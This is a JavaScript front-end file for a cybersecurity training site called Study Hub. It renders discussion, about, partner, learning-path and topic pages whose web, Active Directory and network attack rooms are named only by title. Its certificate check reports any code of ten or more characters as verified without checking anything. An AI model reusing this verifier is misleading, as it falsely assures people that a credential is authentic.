                .doc-card:hover { border-color: rgba(59, 130, 246, 0.5); background: rgba(255,255,255,0.08); }
                .doc-icon { width: 60px; height: 60px; background: rgba(59, 130, 246, 0.2); border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #3b82f6; font-size: 1.5rem; }
                .doc-info h3 { color: #fff; font-size: 1.2rem; margin-bottom: 5px; }
                .doc-info p { color: rgba(255,255,255,0.6); font-size: 0.9rem; }
                .doc-sections { display: flex; gap: 10px; flex-wrap: wrap; }
                .doc-section { background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.7); padding: 6px 12px; border-radius: 6px; font-size: 0.8rem; }
            </style>

            <div class="docs-container">
                <div class="docs-header">
                    <h1 class="docs-title"><i class="fa-solid fa-book"></i> Documentation</h1>
                    <p style="color: rgba(255,255,255,0.6);">Everything you need to know about Study Hub</p>
                    <div class="docs-search">
                        <input type="text" placeholder="Search documentation..." />
                    </div>
                </div>

                <div class="docs-grid">
                    ${docs.map(doc => `
                        <div class="doc-card" onclick="showToast('Documentation page coming soon!', 'info')">
                            <div class="doc-icon"><i class="fa-solid ${doc.icon}"></i></div>
                            <div class="doc-info">
                                <h3>${doc.title}</h3>
                                <p>${doc.desc}</p>
                            </div>
                            <div class="doc-sections">
                                ${doc.sections.map(s => `<span class="doc-section">${s}</span>`).join('')}
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== DISCUSSIONS PAGE ====================
function pageDiscussions() {
    const discussions = [
        { title: 'Best resources for OSCP prep?', author: 'CyberNinja', replies: 24, views: 1250, hot: true },
        { title: 'SQL Injection cheatsheet request', author: 'WebHacker', replies: 18, views: 890 },
        { title: 'New to pentesting - where to start?', author: 'Beginner01', replies: 42, views: 2100, hot: true },
        { title: 'CTF team looking for members', author: 'TeamLead', replies: 15, views: 650 },
        { title: 'Burp Suite vs OWASP ZAP', author: 'ToolExplorer', replies: 31, views: 1450 },
        { title: 'HackTheBox vs TryHackMe comparison', author: 'PlatformReviewer', replies: 56, views: 3200, hot: true }
    ];

    return `
        <div class="discussions-page">
            <style>
                .discussions-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .disc-container { max-width: 900px; margin: 0 auto; }
                .disc-header { text-align: center; margin-bottom: 40px; }
                .disc-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .disc-title i { color: #22c55e; margin-right: 15px; }
                .new-thread-btn { background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 15px 30px; border-radius: 12px; font-weight: 700; border: none; cursor: pointer; margin-top: 20px; }
                .thread-list { display: flex; flex-direction: column; gap: 15px; }
                .thread-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 20px; display: grid; grid-template-columns: 1fr 150px; gap: 20px; align-items: center; cursor: pointer; transition: all 0.3s; }
                .thread-card:hover { border-color: rgba(34, 197, 94, 0.5); }
                .thread-info h3 { color: #fff; font-size: 1.1rem; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
                .hot-badge { background: #ef4444; color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: 700; }
                .thread-author { color: rgba(255,255,255,0.5); font-size: 0.9rem; }
                .thread-author span { color: #22c55e; }
                .thread-stats { display: flex; gap: 20px; }
                .stat { text-align: center; }
                .stat-val { color: #fff; font-weight: 700; font-size: 1.2rem; }
                .stat-label { color: rgba(255,255,255,0.4); font-size: 0.75rem; }
            </style>

            <div class="disc-container">
                <div class="disc-header">
                    <h1 class="disc-title"><i class="fa-solid fa-comments"></i> Community Discussions</h1>
                    <p style="color: rgba(255,255,255,0.6);">Ask questions, share knowledge, connect with learners</p>
                    <button class="new-thread-btn" onclick="showToast('Create thread coming soon!', 'info')"><i class="fa-solid fa-plus"></i> New Thread</button>
                </div>

                <div class="thread-list">
                    ${discussions.map(d => `
                        <div class="thread-card" onclick="showToast('Thread view coming soon!', 'info')">
                            <div class="thread-info">
                                <h3>${d.title} ${d.hot ? '<span class="hot-badge">HOT</span>' : ''}</h3>
                                <div class="thread-author">by <span>${d.author}</span></div>
                            </div>
                            <div class="thread-stats">
                                <div class="stat">
                                    <div class="stat-val">${d.replies}</div>
                                    <div class="stat-label">Replies</div>
                                </div>
                                <div class="stat">
                                    <div class="stat-val">${d.views}</div>
                                    <div class="stat-label">Views</div>
                                </div>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== ABOUT PAGE ====================
function pageAbout() {
    return `
        <div class="about-page">
            <style>
                .about-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 60px 20px; }
                .about-container { max-width: 900px; margin: 0 auto; }
                .about-header { text-align: center; margin-bottom: 60px; }
                .about-logo { font-size: 4rem; margin-bottom: 20px; }
                .about-title { font-size: 3rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .about-title span { color: #22c55e; }
                .about-tagline { color: rgba(255,255,255,0.6); font-size: 1.2rem; margin-top: 15px; }
                .about-section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; margin-bottom: 30px; }
                .about-section h2 { color: #22c55e; font-size: 1.5rem; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
                .about-section p { color: rgba(255,255,255,0.7); line-height: 1.8; font-size: 1.05rem; }
                .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-top: 40px; }
                .stat-card { text-align: center; padding: 30px; background: rgba(34, 197, 94, 0.1); border-radius: 16px; }
                .stat-number { font-size: 2.5rem; font-weight: 800; color: #22c55e; font-family: 'Orbitron', sans-serif; }
                .stat-text { color: rgba(255,255,255,0.6); margin-top: 8px; }
                @media (max-width: 768px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } }
            </style>

            <div class="about-container">
                <div class="about-header">
                    <div class="about-logo"><i class="fa-solid fa-shield-halved" style="color: #22c55e;"></i></div>
                    <h1 class="about-title">Study<span>Hub</span></h1>
                    <p class="about-tagline">Your journey to becoming a cybersecurity expert starts here</p>
                </div>

                <div class="about-section">
                    <h2><i class="fa-solid fa-bullseye"></i> Our Mission</h2>
                    <p>Study Hub is dedicated to making cybersecurity education accessible to everyone. We believe in learning by doing, which is why we've built a platform with hands-on labs, real-world challenges, and structured learning paths that take you from beginner to expert.</p>
                </div>

                <div class="about-section">
                    <h2><i class="fa-solid fa-laptop-code"></i> What We Offer</h2>
                    <p>From web application security to network pentesting, from malware analysis to cloud security - our comprehensive curriculum covers all aspects of modern cybersecurity. Each path is designed by industry professionals and includes practical exercises that simulate real-world scenarios.</p>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">50+</div>
                        <div class="stat-text">Learning Rooms</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">100+</div>
                        <div class="stat-text">CTF Challenges</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">10K+</div>
                        <div class="stat-text">Active Learners</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">24/7</div>
                        <div class="stat-text">Lab Access</div>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// ==================== PARTNERS PAGE ====================
function pagePartners() {
    const partners = [
        { name: 'OWASP', logo: 'fa-shield-halved', type: 'Community Partner' },
        { name: 'Hack The Box', logo: 'fa-cube', type: 'Platform Partner' },
        { name: 'PortSwigger', logo: 'fa-spider', type: 'Tools Partner' },
        { name: 'OffSec', logo: 'fa-user-secret', type: 'Certification Partner' },
        { name: 'SANS Institute', logo: 'fa-graduation-cap', type: 'Education Partner' },
        { name: 'EC-Council', logo: 'fa-certificate', type: 'Certification Partner' }
    ];

    return `
        <div class="partners-page">
            <style>
                .partners-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 60px 20px; }
                .partners-container { max-width: 1000px; margin: 0 auto; }
                .partners-header { text-align: center; margin-bottom: 60px; }
                .partners-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .partners-title i { color: #22c55e; margin-right: 15px; }
                .partners-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
                .partner-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; text-align: center; transition: all 0.3s; }
                .partner-card:hover { border-color: rgba(34, 197, 94, 0.5); transform: translateY(-5px); }
                .partner-logo { width: 80px; height: 80px; background: rgba(34, 197, 94, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 2rem; color: #22c55e; }
                .partner-name { color: #fff; font-size: 1.3rem; font-weight: 700; margin-bottom: 8px; }
                .partner-type { color: rgba(255,255,255,0.5); font-size: 0.9rem; }
                .become-partner { background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 15px 40px; border-radius: 12px; font-weight: 700; border: none; cursor: pointer; margin-top: 40px; display: inline-block; }
            </style>

            <div class="partners-container">
                <div class="partners-header">
                    <h1 class="partners-title"><i class="fa-solid fa-handshake"></i> Our Partners</h1>
                    <p style="color: rgba(255,255,255,0.6);">Working together to advance cybersecurity education</p>
                </div>

                <div class="partners-grid">
                    ${partners.map(p => `
                        <div class="partner-card">
                            <div class="partner-logo"><i class="fa-solid ${p.logo}"></i></div>
                            <div class="partner-name">${p.name}</div>
                            <div class="partner-type">${p.type}</div>
                        </div>
                    `).join('')}
                </div>

                <div style="text-align: center;">
                    <button class="become-partner" onclick="showToast('Contact form coming soon!', 'info')">
                        <i class="fa-solid fa-envelope"></i> Become a Partner
                    </button>
                </div>
            </div>
        </div>
    `;
}

// ==================== VERIFY CERTIFICATE PAGE ====================
function pageVerify() {
    return `
        <div class="verify-page">
            <style>
                .verify-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 60px 20px; display: flex; align-items: center; justify-content: center; }
                .verify-container { max-width: 500px; width: 100%; }
                .verify-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 50px; text-align: center; }
                .verify-icon { font-size: 4rem; color: #ffd700; margin-bottom: 25px; }
                .verify-title { font-size: 2rem; font-weight: 800; color: #fff; margin-bottom: 15px; }
                .verify-desc { color: rgba(255,255,255,0.6); margin-bottom: 30px; }
                .verify-input { width: 100%; padding: 18px; background: rgba(255,255,255,0.05); border: 2px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; font-size: 1.1rem; text-align: center; font-family: 'JetBrains Mono', monospace; letter-spacing: 2px; }
                .verify-input:focus { outline: none; border-color: #22c55e; }
                .verify-input::placeholder { color: rgba(255,255,255,0.3); letter-spacing: 0; }
                .verify-btn { width: 100%; background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 18px; border-radius: 12px; font-weight: 700; font-size: 1.1rem; border: none; cursor: pointer; margin-top: 20px; transition: all 0.3s; }
                .verify-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(34, 197, 94, 0.3); }
            </style>

            <div class="verify-container">
                <div class="verify-card">
                    <div class="verify-icon"><i class="fa-solid fa-certificate"></i></div>
                    <h1 class="verify-title">Verify Certificate</h1>
                    <p class="verify-desc">Enter the certificate code to verify its authenticity</p>
                    <input type="text" class="verify-input" placeholder="CERT-XXXX-XXXX-XXXX" id="cert-code" maxlength="19" />
                    <button class="verify-btn" onclick="verifyCertificateCode()">
                        <i class="fa-solid fa-search"></i> Verify Certificate
                    </button>
                </div>
            </div>
        </div>
    `;
}

function verifyCertificateCode() {
    const code = document.getElementById('cert-code')?.value;
    if (!code || code.length < 10) {
        showToast('Please enter a valid certificate code', 'error');
        return;
    }
    showToast('Certificate verified! ✓', 'success');
}

// Make all functions globally available
window.pageCheatsheets = pageCheatsheets;
window.pageVideos = pageVideos;
window.pageDocs = pageDocs;
window.pageDiscussions = pageDiscussions;
window.pageAbout = pageAbout;
window.pagePartners = pagePartners;
window.pageVerify = pageVerify;
window.verifyCertificateCode = verifyCertificateCode;

// ==================== PATH PAGES (Red Team, Blue Team, SOC) ====================
function pagePathRedTeam() {
    const modules = [
        { title: 'Reconnaissance', desc: 'Information gathering and OSINT', icon: 'fa-binoculars', rooms: 4, progress: 0 },
        { title: 'Web Exploitation', desc: 'SQL injection, XSS, IDOR and more', icon: 'fa-globe', rooms: 8, progress: 0 },
        { title: 'Network Attacks', desc: 'MITM, sniffing, pivoting', icon: 'fa-network-wired', rooms: 5, progress: 0 },
        { title: 'Password Attacks', desc: 'Cracking, brute force, spraying', icon: 'fa-key', rooms: 3, progress: 0 },
        { title: 'Privilege Escalation', desc: 'Linux and Windows privesc', icon: 'fa-arrow-up', rooms: 6, progress: 0 },
        { title: 'Active Directory', desc: 'Domain attacks and persistence', icon: 'fa-server', rooms: 7, progress: 0 }
    ];

    return `
        <div class="path-page">
            <style>
                .path-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .path-container { max-width: 1100px; margin: 0 auto; }
                .path-hero { background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(153, 27, 27, 0.2)); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 24px; padding: 50px; margin-bottom: 40px; text-align: center; }
                .path-icon { width: 100px; height: 100px; background: rgba(239, 68, 68, 0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; font-size: 2.5rem; color: #ef4444; }
                .path-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; margin-bottom: 15px; }
                .path-desc { color: rgba(255,255,255,0.7); font-size: 1.1rem; max-width: 600px; margin: 0 auto 25px; line-height: 1.6; }
                .path-stats { display: flex; justify-content: center; gap: 40px; }
                .path-stat { text-align: center; }
                .stat-num { font-size: 2rem; font-weight: 800; color: #ef4444; }
                .stat-lbl { color: rgba(255,255,255,0.5); font-size: 0.9rem; }
                .modules-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
                .module-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; cursor: pointer; transition: all 0.3s; }
                .module-card:hover { border-color: rgba(239, 68, 68, 0.5); transform: translateY(-5px); }
                .module-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
                .module-icon { width: 50px; height: 50px; background: rgba(239, 68, 68, 0.2); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; color: #ef4444; }
                .module-title { color: #fff; font-weight: 600; font-size: 1.1rem; }
                .module-rooms { color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .module-desc { color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-bottom: 15px; }
                .module-progress { height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; }
                .module-bar { height: 100%; background: linear-gradient(90deg, #ef4444, #dc2626); border-radius: 3px; }
                .start-btn { background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; padding: 15px 40px; border-radius: 12px; font-weight: 700; border: none; cursor: pointer; margin-top: 20px; }
            </style>

            <div class="path-container">
                <div class="path-hero">
                    <div class="path-icon"><i class="fa-solid fa-user-secret"></i></div>
                    <h1 class="path-title">Red Team Path</h1>
                    <p class="path-desc">Master offensive security techniques. Learn to think like an attacker and find vulnerabilities before malicious actors do.</p>
                    <div class="path-stats">
                        <div class="path-stat"><div class="stat-num">33</div><div class="stat-lbl">Rooms</div></div>
                        <div class="path-stat"><div class="stat-num">40+</div><div class="stat-lbl">Hours</div></div>
                        <div class="path-stat"><div class="stat-num">6</div><div class="stat-lbl">Modules</div></div>
                    </div>
                    <button class="start-btn" onclick="loadPage('learn')"><i class="fa-solid fa-play"></i> Start Path</button>
                </div>

                <div class="modules-grid">
                    ${modules.map(m => `
                        <div class="module-card" onclick="loadPage('learn')">
                            <div class="module-header">
                                <div class="module-icon"><i class="fa-solid ${m.icon}"></i></div>
                                <div>
                                    <div class="module-title">${m.title}</div>
                                    <div class="module-rooms">${m.rooms} rooms</div>
                                </div>
                            </div>
                            <div class="module-desc">${m.desc}</div>
                            <div class="module-progress"><div class="module-bar" style="width: ${m.progress}%"></div></div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

function pagePathBlueTeam() {
    const modules = [
        { title: 'Security Monitoring', desc: 'SIEM, log analysis, detection', icon: 'fa-eye', rooms: 5, progress: 0 },
        { title: 'Incident Response', desc: 'Containment, eradication, recovery', icon: 'fa-ambulance', rooms: 6, progress: 0 },
        { title: 'Threat Intelligence', desc: 'IOCs, TTPs, threat hunting', icon: 'fa-crosshairs', rooms: 4, progress: 0 },
        { title: 'Forensics', desc: 'Disk, memory, network forensics', icon: 'fa-microscope', rooms: 7, progress: 0 },
        { title: 'Malware Analysis', desc: 'Static and dynamic analysis', icon: 'fa-bug', rooms: 5, progress: 0 },
        { title: 'Hardening', desc: 'System and network hardening', icon: 'fa-shield-halved', rooms: 4, progress: 0 }
    ];

    return `
        <div class="path-page">
            <style>
                .path-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .path-container { max-width: 1100px; margin: 0 auto; }
                .path-hero { background: linear-gradient(135deg, rgba(59, 130, 246, 0.2), rgba(29, 78, 216, 0.2)); border: 1px solid rgba(59, 130, 246, 0.3); border-radius: 24px; padding: 50px; margin-bottom: 40px; text-align: center; }
                .path-icon { width: 100px; height: 100px; background: rgba(59, 130, 246, 0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; font-size: 2.5rem; color: #3b82f6; }
                .path-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; margin-bottom: 15px; }
                .path-desc { color: rgba(255,255,255,0.7); font-size: 1.1rem; max-width: 600px; margin: 0 auto 25px; line-height: 1.6; }
                .path-stats { display: flex; justify-content: center; gap: 40px; }
                .path-stat { text-align: center; }
                .stat-num { font-size: 2rem; font-weight: 800; color: #3b82f6; }
                .stat-lbl { color: rgba(255,255,255,0.5); font-size: 0.9rem; }
                .modules-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
                .module-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; cursor: pointer; transition: all 0.3s; }
                .module-card:hover { border-color: rgba(59, 130, 246, 0.5); transform: translateY(-5px); }
                .module-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
                .module-icon { width: 50px; height: 50px; background: rgba(59, 130, 246, 0.2); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; color: #3b82f6; }
                .module-title { color: #fff; font-weight: 600; font-size: 1.1rem; }
                .module-rooms { color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .module-desc { color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-bottom: 15px; }
                .module-progress { height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; }
                .module-bar { height: 100%; background: linear-gradient(90deg, #3b82f6, #1d4ed8); border-radius: 3px; }
                .start-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: #fff; padding: 15px 40px; border-radius: 12px; font-weight: 700; border: none; cursor: pointer; margin-top: 20px; }
            </style>

            <div class="path-container">
                <div class="path-hero">
                    <div class="path-icon"><i class="fa-solid fa-shield-halved"></i></div>
                    <h1 class="path-title">Blue Team Path</h1>
                    <p class="path-desc">Master defensive security. Learn to detect, respond to, and prevent cyber attacks to protect organizations.</p>
                    <div class="path-stats">
                        <div class="path-stat"><div class="stat-num">31</div><div class="stat-lbl">Rooms</div></div>
                        <div class="path-stat"><div class="stat-num">35+</div><div class="stat-lbl">Hours</div></div>
                        <div class="path-stat"><div class="stat-num">6</div><div class="stat-lbl">Modules</div></div>
                    </div>
                    <button class="start-btn" onclick="loadPage('learn')"><i class="fa-solid fa-play"></i> Start Path</button>
                </div>

                <div class="modules-grid">
                    ${modules.map(m => `
                        <div class="module-card" onclick="loadPage('learn')">
                            <div class="module-header">
                                <div class="module-icon"><i class="fa-solid ${m.icon}"></i></div>
                                <div>
                                    <div class="module-title">${m.title}</div>
                                    <div class="module-rooms">${m.rooms} rooms</div>
                                </div>
                            </div>
                            <div class="module-desc">${m.desc}</div>
                            <div class="module-progress"><div class="module-bar" style="width: ${m.progress}%"></div></div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

function pagePathSoc() {
    const modules = [
        { title: 'SOC Fundamentals', desc: 'SOC structure, tools, processes', icon: 'fa-building', rooms: 4, progress: 0 },
        { title: 'Log Analysis', desc: 'Windows, Linux, network logs', icon: 'fa-file-lines', rooms: 6, progress: 0 },
        { title: 'SIEM Operations', desc: 'Splunk, ELK, QRadar', icon: 'fa-chart-line', rooms: 5, progress: 0 },
        { title: 'Alert Triage', desc: 'True vs false positives', icon: 'fa-bell', rooms: 4, progress: 0 },
        { title: 'Incident Handling', desc: 'Playbooks and procedures', icon: 'fa-clipboard-list', rooms: 5, progress: 0 }
    ];

    return `
        <div class="path-page">
            <style>
                .path-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .path-container { max-width: 1100px; margin: 0 auto; }
                .path-hero { background: linear-gradient(135deg, rgba(34, 197, 94, 0.2), rgba(22, 163, 74, 0.2)); border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 24px; padding: 50px; margin-bottom: 40px; text-align: center; }
                .path-icon { width: 100px; height: 100px; background: rgba(34, 197, 94, 0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; font-size: 2.5rem; color: #22c55e; }
                .path-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; margin-bottom: 15px; }
                .path-desc { color: rgba(255,255,255,0.7); font-size: 1.1rem; max-width: 600px; margin: 0 auto 25px; line-height: 1.6; }
                .path-stats { display: flex; justify-content: center; gap: 40px; }
                .path-stat { text-align: center; }
                .stat-num { font-size: 2rem; font-weight: 800; color: #22c55e; }
                .stat-lbl { color: rgba(255,255,255,0.5); font-size: 0.9rem; }
                .modules-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
                .module-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; cursor: pointer; transition: all 0.3s; }
                .module-card:hover { border-color: rgba(34, 197, 94, 0.5); transform: translateY(-5px); }
                .module-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
                .module-icon { width: 50px; height: 50px; background: rgba(34, 197, 94, 0.2); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.3rem; color: #22c55e; }
                .module-title { color: #fff; font-weight: 600; font-size: 1.1rem; }
                .module-rooms { color: rgba(255,255,255,0.5); font-size: 0.85rem; }
                .module-desc { color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-bottom: 15px; }
                .module-progress { height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; }
                .module-bar { height: 100%; background: linear-gradient(90deg, #22c55e, #16a34a); border-radius: 3px; }
                .start-btn { background: linear-gradient(135deg, #22c55e, #16a34a); color: #000; padding: 15px 40px; border-radius: 12px; font-weight: 700; border: none; cursor: pointer; margin-top: 20px; }
            </style>

            <div class="path-container">
                <div class="path-hero">
                    <div class="path-icon"><i class="fa-solid fa-desktop"></i></div>
                    <h1 class="path-title">SOC Analyst Path</h1>
                    <p class="path-desc">Become a Security Operations Center analyst. Monitor, detect, and respond to security incidents.</p>
                    <div class="path-stats">
                        <div class="path-stat"><div class="stat-num">24</div><div class="stat-lbl">Rooms</div></div>
                        <div class="path-stat"><div class="stat-num">30+</div><div class="stat-lbl">Hours</div></div>
                        <div class="path-stat"><div class="stat-num">5</div><div class="stat-lbl">Modules</div></div>
                    </div>
                    <button class="start-btn" onclick="loadPage('learn')"><i class="fa-solid fa-play"></i> Start Path</button>
                </div>

                <div class="modules-grid">
                    ${modules.map(m => `
                        <div class="module-card" onclick="loadPage('learn')">
                            <div class="module-header">
                                <div class="module-icon"><i class="fa-solid ${m.icon}"></i></div>
                                <div>
                                    <div class="module-title">${m.title}</div>
                                    <div class="module-rooms">${m.rooms} rooms</div>
                                </div>
                            </div>
                            <div class="module-desc">${m.desc}</div>
                            <div class="module-progress"><div class="module-bar" style="width: ${m.progress}%"></div></div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== TOPIC PAGES ====================
// ==================== TOPIC PAGES ====================
function createTopicPage(config) {
    // ... (keep existing implementation) ...
    // Note: I cannot use 'keep existing' in Replace tool unless I include it.
    // I will insert pageTopicAD AFTER pageTopicWeb.
    return `
        <div class="topic-page">
            <style>
                .topic-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .topic-container { max-width: 1100px; margin: 0 auto; }
                .topic-header { text-align: center; margin-bottom: 50px; }
                .topic-icon { width: 80px; height: 80px; background: ${config.color}20; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 2rem; color: ${config.color}; }
                .topic-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .topic-subtitle { color: rgba(255,255,255,0.6); margin-top: 10px; }
                .rooms-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
                .room-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; cursor: pointer; transition: all 0.3s; }
                .room-card:hover { border-color: ${config.color}80; transform: translateY(-5px); }
                .room-title { color: #fff; font-weight: 600; font-size: 1.1rem; margin-bottom: 10px; }
                .room-desc { color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-bottom: 15px; line-height: 1.5; }
                .room-meta { display: flex; gap: 15px; }
                .room-meta span { color: rgba(255,255,255,0.5); font-size: 0.8rem; display: flex; align-items: center; gap: 5px; }
                .room-meta i { color: ${config.color}; }
            </style>

            <div class="topic-container">
                <div class="topic-header">
                    <div class="topic-icon"><i class="fa-solid ${config.icon}"></i></div>
                    <h1 class="topic-title">${config.title}</h1>
                    <p class="topic-subtitle">${config.subtitle}</p>
                </div>

                <div class="rooms-grid">
                    ${config.rooms.map(room => {
        const slug = room.id || room.title.toLowerCase().replace(/ /g, '-');
        return `
                        <div class="room-card" onclick="loadPage('ctf-challenge', '${slug}')">
                            <div class="room-title">${room.title}</div>
                            <div class="room-desc">${room.desc}</div>
                            <div class="room-meta">
                                <span><i class="fa-solid fa-clock"></i> ${room.time}</span>
                                <span><i class="fa-solid fa-star"></i> ${room.points} pts</span>
                                <span><i class="fa-solid fa-signal"></i> ${room.difficulty}</span>
                            </div>
                        </div>
                    `}).join('')}
                </div>
            </div>
        </div>
    `;
}

function pageTopicWeb() {
    return createTopicPage({
        title: 'Web Security',
        subtitle: 'Master web application vulnerabilities',
        icon: 'fa-globe',
        color: '#ef4444',
        rooms: [
            { title: 'SQL Injection', desc: 'Extract data from databases using SQLi', time: '45 min', points: 150, difficulty: 'Medium' },
            { title: 'Cross-Site Scripting', desc: 'Inject malicious scripts into web pages', time: '40 min', points: 120, difficulty: 'Easy' },
            { title: 'IDOR Attacks', desc: 'Access unauthorized resources', time: '35 min', points: 100, difficulty: 'Easy' },
            { title: 'SSRF Exploitation', desc: 'Make server requests on your behalf', time: '50 min', points: 180, difficulty: 'Medium' },
            { title: 'Authentication Bypass', desc: 'Break login mechanisms', time: '45 min', points: 160, difficulty: 'Medium' },
            { title: 'File Upload Vulns', desc: 'Upload malicious files to servers', time: '40 min', points: 140, difficulty: 'Medium' }
        ]
    });
}

function pageTopicAD() {
    return createTopicPage({
        title: 'Active Directory',
        subtitle: 'Dominate the Windows Domain',
        icon: 'fa-network-wired',
        color: '#a855f7',
        rooms: [
            { title: 'Kerberoasting', desc: 'Abuse Kerberos service tickets', time: '50 min', points: 150, difficulty: 'Medium' },
            { title: 'BloodHound', desc: 'Map attack paths in AD', time: '60 min', points: 100, difficulty: 'Easy' },
            { title: 'ZeroLogon', desc: 'Exploit Netlogon crypto flaw', time: '40 min', points: 200, difficulty: 'Hard' },
            { title: 'GPO Abuse', desc: 'Weaponize Group Policy', time: '55 min', points: 160, difficulty: 'Medium' },
            { title: 'Golden Ticket', desc: 'Create a TGT for persistence', time: '70 min', points: 250, difficulty: 'Hard' },
            { title: 'LLMNR Poisoning', desc: 'Capture Hashes on Network', time: '45 min', points: 120, difficulty: 'Easy' }
        ]
    });
}

function pageTopicNetwork() {
    return createTopicPage({
        title: 'Network Security',
        subtitle: 'Understand network protocols and attacks',
        icon: 'fa-network-wired',
        color: '#3b82f6',
        rooms: [
            { title: 'Network Fundamentals', desc: 'OSI model, TCP/IP, protocols', time: '60 min', points: 100, difficulty: 'Easy' },
            { title: 'Nmap Scanning', desc: 'Port scanning and enumeration', time: '45 min', points: 120, difficulty: 'Easy' },
            { title: 'Wireshark Analysis', desc: 'Capture and analyze network traffic', time: '50 min', points: 140, difficulty: 'Medium' },
            { title: 'MITM Attacks', desc: 'Intercept network communications', time: '55 min', points: 180, difficulty: 'Medium' },
            { title: 'ARP Spoofing', desc: 'Redirect traffic on local network', time: '40 min', points: 150, difficulty: 'Medium' },
